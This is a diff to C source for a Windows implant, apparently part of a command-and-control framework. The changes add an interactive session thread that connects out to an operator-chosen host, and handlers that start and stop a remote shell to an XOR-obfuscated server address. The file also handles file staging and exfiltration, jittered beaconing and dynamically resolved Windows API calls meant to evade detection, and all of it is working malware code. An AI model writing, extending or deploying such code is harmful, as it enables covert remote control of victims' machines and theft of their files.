@@ -1,3 +1,4 @@
+#include <winsock2.h>
 #include <windows.h>
 #include <bcrypt.h>
 #include <string.h>
@@ -12,6 +13,8 @@
 #include "obf_strings.h"
 #include "dynapi.h"
 #include "transfer.h"
+#include "session.h"
+#include "shell.h"
 
 /* ---- Sysinfo ---- */
 
@@ -71,6 +74,31 @@ static void collect_sysinfo(implant_metadata_t *meta) {
     meta->integrity = get_integrity();
 }
 
+/* ---- Session thread (non-blocking) ---- */
+
+#ifdef SESSION_PORT
+static volatile LONG g_session_active = 0;
+static volatile LONG g_wsa_init = 0;
+
+typedef struct {
+    SOCKET sock;
+    uint8_t *session_key;
+    uint32_t beacon_id;
+    DWORD *sleep_ms;
+    DWORD *jitter_pct;
+} session_ctx_t;
+
+static DWORD WINAPI session_thread_fn(LPVOID param) {
+    session_ctx_t *ctx = (session_ctx_t *)param;
+    session_loop(ctx->sock, ctx->session_key, ctx->beacon_id,
+                 ctx->sleep_ms, ctx->jitter_pct);
+    fnClosesocket(ctx->sock);
+    InterlockedExchange(&g_session_active, 0);
+    fnLocalFree(ctx);
+    return 0;
+}
+#endif
+
 /* ---- Registration ---- */
 
 static int do_full_register(implant_metadata_t *meta) {
@@ -124,7 +152,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
         got_task = 0;
         uint8_t *resp_buf = (uint8_t *)fnLocalAlloc(0x40, 4 * 1024 * 1024);
         DWORD resp_len = 4 * 1024 * 1024;
-        if (!resp_buf) { Sleep(sleep_ms); continue; }
+        if (!resp_buf) { fnSleep(sleep_ms); continue; }
 
         if (do_checkin(meta.id, resp_buf, &resp_len) < 0) {
             fnLocalFree(resp_buf);
@@ -187,12 +215,61 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                         else if (hdr.type == TASK_FILE_STAGE && task_data) {
                             handle_file_stage(meta.id, hdr.label, hdr.identifier,
                                               hdr.flags, task_data, task_data_len,
-                                              meta.session_key);
+                                              meta.session_key, INVALID_SOCKET);
                         }
                         else if (hdr.type == TASK_FILE_EXFIL && task_data) {
                             handle_file_exfil(meta.id, hdr.label,
                                               (const char *)task_data,
-                                              meta.session_key);
+                                              meta.session_key, INVALID_SOCKET);
+                        }
+                        #ifdef SESSION_PORT
+                        else if (hdr.type == TASK_INTERACTIVE && task_data) {
+                            if (InterlockedCompareExchange(&g_session_active, 0, 0) == 0) {
+                                char host[256] = {0};
+                                uint16_t sport = 0;
+                                if (parse_interactive_req(task_data, (int)task_data_len,
+                                                          host, sizeof(host), &sport) == 0) {
+                                    if (!g_wsa_init) {
+                                        if (session_init() == 0) g_wsa_init = 1;
+                                    }
+                                    if (g_wsa_init) {
+                                        SOCKET s = session_connect(host, sport);
+                                        if (s != INVALID_SOCKET) {
+                                            session_ctx_t *sc = (session_ctx_t *)fnLocalAlloc(
+                                                                    0x40, sizeof(session_ctx_t));
+                                            if (sc) {
+                                                sc->sock        = s;
+                                                sc->session_key = meta.session_key;
+                                                sc->beacon_id   = meta.id;
+                                                sc->sleep_ms    = &sleep_ms;
+                                                sc->jitter_pct  = &jitter_pct;
+                                                InterlockedExchange(&g_session_active, 1);
+                                                HANDLE ht = fnCreateThread(NULL, 0,
+                                                                session_thread_fn, sc, 0, NULL);
+                                                if (ht) {
+                                                    fnCloseHandle2(ht);
+                                                } else {
+                                                    InterlockedExchange(&g_session_active, 0);
+                                                    fnClosesocket(s);
+                                                    fnLocalFree(sc);
+                                                }
+                                            } else {
+                                                fnClosesocket(s);
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                        #endif
+                        else if (hdr.type == TASK_SHELL_START && task_data && task_data_len >= 2) {
+                            uint16_t shell_port = (uint16_t)task_data[0] | ((uint16_t)task_data[1] << 8);
+                            char shell_host[ENC_SERVER_HOST_LEN + 1];
+                            xor_dec(shell_host, ENC_SERVER_HOST, ENC_SERVER_HOST_LEN);
+                            shell_start(shell_host, shell_port, meta.session_key, meta.id, hdr.label);
+                        }
+                        else if (hdr.type == TASK_SHELL_STOP) {
+                            shell_stop();
                         }
                         else if (hdr.type == TASK_EXIT) {
                             fnExitProcess(0);
@@ -216,6 +293,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
             fnBCryptGenRandom(NULL, (PUCHAR)&r, sizeof(r), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
             actual_sleep += r % jitter_range;
         }
-        Sleep(actual_sleep);
+        fnSleep(actual_sleep);
     }
 }
